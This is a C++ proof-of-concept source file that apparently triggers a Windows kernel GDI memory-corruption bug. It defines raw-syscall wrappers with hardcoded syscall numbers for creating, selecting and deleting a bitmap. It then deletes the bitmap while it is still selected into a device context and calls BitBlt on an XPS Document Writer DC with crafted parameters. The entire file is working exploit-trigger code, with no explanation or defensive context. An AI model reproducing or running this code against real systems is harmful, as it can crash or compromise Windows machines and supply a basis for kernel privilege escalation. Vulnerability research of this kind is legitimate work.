/*
 * cl.exe poc.cpp user32.lib gdi32.lib
 */

#include <stdio.h>
#include <tchar.h>
#include <Windows.h>

__declspec(noinline) HBITMAP __stdcall NtGdiCreateCompatibleBitmap(HANDLE hdc, DWORD d1, DWORD d2) {
        __asm {
                push d2
                push d1
                push hdc
                push 0x0
                mov eax, 0x101f
                mov edx, 0x7ffe0300
                call dword ptr [edx]
                add esp, 0x10
        }
}

__declspec(noinline) int __stdcall NtGdiSelectBitmap(HDC hdc, HBITMAP hbmp) {
        __asm {
                push hbmp
                push hdc
                push 0x0
                mov eax, 0x110b
                mov edx, 0x7ffe0300
                call dword ptr [edx]
                add esp, 0xc
        }
}

__declspec(noinline) HBRUSH __stdcall NtGdiDeleteObjectApp(HANDLE h) {
        __asm {
                push h
                push 0x0
                mov eax, 0x107d
                mov edx, 0x7ffe0300
                call dword ptr [edx]
                add esp, 0x8
        }
}


int _tmain(int argc, _TCHAR* argv[])
{
        HDC hdc1 = GetWindowDC(GetDesktopWindow());
        printf("[-] hdc1: %08x\n", hdc1);
        HBITMAP hbmp = NtGdiCreateCompatibleBitmap(hdc1, 0x5, 0x42);
        printf("[-] hbmp: %08x\n", hbmp);
        HDC hdc2 = CreateCompatibleDC(hdc1);
        printf("[-] hdc2: %08x\n", hdc2);
        NtGdiSelectBitmap(hdc2, hbmp);
        NtGdiDeleteObjectApp(hbmp);
        HDC hdc3 = CreateDCA(0, "Microsoft XPS Document Writer", 0, 0);
        printf("[-] hdc3: %08x\n", hdc3);
        BitBlt(hdc3, 0x62,0x55, 0x42,0x8000,hdc2,0xe1, 0xc4, 0xbb0226);
}
